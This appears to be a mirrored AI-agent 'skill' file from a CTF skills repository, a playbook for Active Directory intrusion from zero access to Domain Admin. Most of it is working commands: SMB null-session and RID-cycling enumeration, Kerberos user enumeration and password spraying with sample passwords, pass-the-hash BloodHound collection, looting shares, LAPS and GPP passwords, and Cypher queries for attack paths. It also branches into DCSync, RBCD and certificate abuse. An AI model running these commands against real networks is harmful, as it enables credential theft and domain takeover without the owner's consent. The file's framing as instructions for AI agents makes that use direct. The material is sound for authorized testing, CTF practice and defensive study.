# AD Enumeration and BloodHound Attack-Path Mapping

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/active-directory/ad-enum-bloodhound.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/active-directory/ad-enum-bloodhound.md)

---

---
name: ad-enum-bloodhound
category: active-directory
triggers: ["bloodhound", "sharphound", "bloodhound-python", "AD enumeration", "no creds", "null session", "RID cycling", "rid-brute", "ldap enum", "nxc smb", "attack path", "domain recon"]
tools: ["netexec/nxc", "bloodhound-python", "SharpHound", "BloodHound CE", "impacket", "ldapsearch", "kerbrute", "enum4linux-ng"]
priority: high
description: Initial Active Directory enumeration from zero access to first credentials, then BloodHound collection and attack-path analysis.
---
# AD Enumeration and BloodHound Attack-Path Mapping

## Trigger context
Use when you have network reach to a domain but limited/no context: an IP range, a DC, maybe an unauthenticated SMB/LDAP surface, or a single low-priv credential. Goal is to move from "no creds" -> "valid creds" -> "graph of privilege escalation paths." This is the entry node for almost every AD engagement.

## Objective
1. Identify the DC(s), domain FQDN, and naming context.
2. Obtain a first valid credential (guessed, sprayed, coerced, or roasted).
3. Collect BloodHound data authenticated as that principal.
4. Analyze the graph to select the shortest path to Domain Admin / target object.

## Methodology (decision tree)
```
Do you have ANY valid domain credential?
├── NO
│   ├── SMB null/guest session allowed?  → RID cycling → user list
│   ├── LDAP anonymous bind allowed?      → dump users/naming context
│   ├── Got a user list?                  → AS-REP roast (no preauth) → maybe hash
│   │                                     → password spray (Spring2026!, <Season><Year>!)
│   └── Coercion possible (Responder)?    → capture/relay NetNTLM
└── YES
    ├── Run bloodhound-python -c all      → ingest into BloodHound CE
    ├── Mark owned principals             → run "Shortest paths to Domain Admins"
    └── Enumerate edges to abuse: Kerberoast, DCSync, GenericAll, ADCS ESC, RBCD
```

## Commands & payloads
```bash
# --- Host / service discovery ---
nxc smb 10.10.10.0/24                     # sweep, shows hostname/domain/signing/OS
nxc smb 10.10.10.10                       # single DC: note "signing:False" (relay candidate)
nxc ldap 10.10.10.10                      # LDAP + naming context + domain functional level

# --- Unauthenticated enumeration (null / guest) ---
nxc smb DC_IP -u '' -p '' --shares --users --pass-pol
nxc smb DC_IP -u 'guest' -p '' --rid-brute 10000      # RID cycling -> usernames
enum4linux-ng -A DC_IP
ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local" -s sub "(objectClass=user)" sAMAccountName

# --- Validate / discover users (Kerberos, no lockout on bad user) ---
kerbrute userenum -d corp.local --dc DC_IP users.txt
kerbrute passwordspray -d corp.local --dc DC_IP users.txt 'Spring2026!'

# --- Password spray with a credential set (WATCH lockout policy first) ---
nxc smb DC_IP -u users.txt -p 'Welcome1!' --continue-on-success
# ^ confirm --pass-pol lockoutThreshold before spraying

# --- Validate a credential set ---
nxc smb DC_IP -u jdoe -p 'Passw0rd!'                 # "[+] ... (Pwn3d!)" = local admin
nxc ldap DC_IP -u jdoe -p 'Passw0rd!'                # LDAP bind works = domain creds valid

# --- BloodHound collection (Linux, remote, no agent on target) ---
bloodhound-python -d corp.local -u jdoe -p 'Passw0rd!' -ns DC_IP -c all --zip
bloodhound-python -d corp.local -u jdoe -p 'Passw0rd!' -ns DC_IP -c DCOnly --zip   # stealthier
bloodhound-python -d corp.local -u jdoe --hashes :NTHASH -ns DC_IP -c all --zip    # pass-the-hash
bloodhound-python -d corp.local -u jdoe -k -no-pass -ns DC_IP -c all --zip         # kerberos ccache

# --- Ingest ---
# Start BloodHound CE:  docker compose up  (or use provided instance)
# Drag the *.zip / *.json into the GUI "Upload" panel.
```

Windows equivalents:
```powershell
# SharpHound collector on a domain-joined / runas box
SharpHound.exe -c All --zipfilename loot.zip
SharpHound.exe -c DCOnly --zipfilename loot.zip       # LDAP-only, stealthier
# or the PowerShell ingestor
Import-Module .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
# ADModule / PowerView for manual enum
Get-DomainUser -SPN | select samaccountname          # kerberoastable
Get-DomainUser -PreauthNotRequired | select samaccountname   # AS-REP roastable
Get-DomainComputer -Unconstrained | select name      # unconstrained delegation → coerce+TGT
Find-InterestingDomainAcl -ResolveGUIDs              # dangerous ACLs
```

High-value BloodHound Cypher queries (paste into the CE search):
```
// Everything an owned user can reach
MATCH p=shortestPath((n {owned:true})-[*1..]->(m)) RETURN p
// Kerberoastable users on a path to DA
MATCH (u:User {hasspn:true}) MATCH p=shortestPath((u)-[*1..]->(g:Group)) WHERE g.name STARTS WITH "DOMAIN ADMINS" RETURN p
// Principals with DCSync
MATCH p=(n)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain) RETURN p
// Computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

Post-collection enumeration to fill gaps BloodHound may miss:
```bash
nxc smb DC_IP -u jdoe -p 'Passw0rd!' --shares            # readable/writable shares (loot creds)
nxc smb DC_IP -u jdoe -p 'Passw0rd!' -M spider_plus      # crawl shares for files
nxc ldap DC_IP -u jdoe -p 'Passw0rd!' -M user-desc       # passwords in description fields
nxc ldap DC_IP -u jdoe -p 'Passw0rd!' -M laps            # readable LAPS passwords
nxc smb DC_IP -u jdoe -p 'Passw0rd!' -M gpp_password     # cPassword in SYSVOL (MS14-025)
```

## Branching logic
- `signing:False` on the DC or a member -> pivot to **ntlm-relay-coerce**.
- User list obtained but no password -> try **asreproasting** first (no creds needed), then spray.
- First credential obtained -> ALWAYS run BloodHound before manual escalation; it reveals non-obvious ACL edges.
- BloodHound shows an edge you own on a user/computer:
  - `MemberOf`/`GenericAll`/`GenericWrite`/`WriteDACL` on user -> targeted **kerberoasting** or reset password.
  - `AddKeyCredentialLink` / `GenericWrite` on computer -> Shadow Credentials (see adcs-esc / UnPAC).
  - `GetChanges`+`GetChangesAll` -> **dcsync-dump**.
  - `AllowedToDelegate` / write on `msDS-AllowedToActOnBehalfOfOtherIdentity` -> RBCD (see ntlm-relay-coerce / pth-ptt-lateral).
- ADCS present (Cert Publishers, PKI objects, `pKIEnrollmentService`) -> run **adcs-esc** (`certipy find -vulnerable`).

## Common pitfalls
- Clock skew breaks Kerberos: `sudo ntpdate DC_IP` or `faketime` before `-k` operations (KRB_AP_ERR_SKEW).
- Wrong DNS: always pass `-ns DC_IP` / set `/etc/resolv.conf` to the DC, or name resolution silently fails.
- Password spraying without checking `lockoutThreshold` locks the domain and burns the engagement.
- BloodHound "Default" vs "All": `All` excludes `LoggedOn`; use `Session`/`LoggedOn` separately if you need live sessions.
- Legacy BloodHound (4.x) vs BloodHound CE use different ingestor versions — match `bloodhound-python`/SharpHound output to the GUI version.
- Case-sensitivity: BloodHound stores names UPPERCASE@DOMAIN; mark owned users exactly.

## Proof / verification
- `nxc` prints `[+]` for valid creds and `(Pwn3d!)` when the account is local admin.
- BloodHound path query returns a rendered graph from an owned node to `DOMAIN ADMINS@CORP.LOCAL`.
- Save the collection zip and a screenshot/JSON of the chosen path as evidence.

## Cross-references
- [sa--instructions--active-directory--asreproasting.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--asreproasting.md), [sa--instructions--active-directory--kerberoasting.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--kerberoasting.md) — turn a user list into crackable hashes.
- [sa--instructions--active-directory--ntlm-relay-coerce.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--ntlm-relay-coerce.md) — when SMB signing is off.
- [sa--instructions--active-directory--dcsync-dump.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--dcsync-dump.md) — cash out replication rights.
- [sa--instructions--active-directory--adcs-esc.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--adcs-esc.md) — certificate-based escalation edges.
- [sa--instructions--active-directory--pth-ptt-lateral.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--pth-ptt-lateral.md) — move with the hashes/tickets you recover.

## Credible sources
- https://github.com/dirkjanm/BloodHound.py
- https://bloodhound.specterops.io/collect-data/enterprise-collection/sharphound
- https://www.netexec.wiki/smb-protocol/enumeration/enumerate-users-by-bruteforcing-rid
- https://www.thehacker.recipes/ad/recon/bloodhound
- https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html
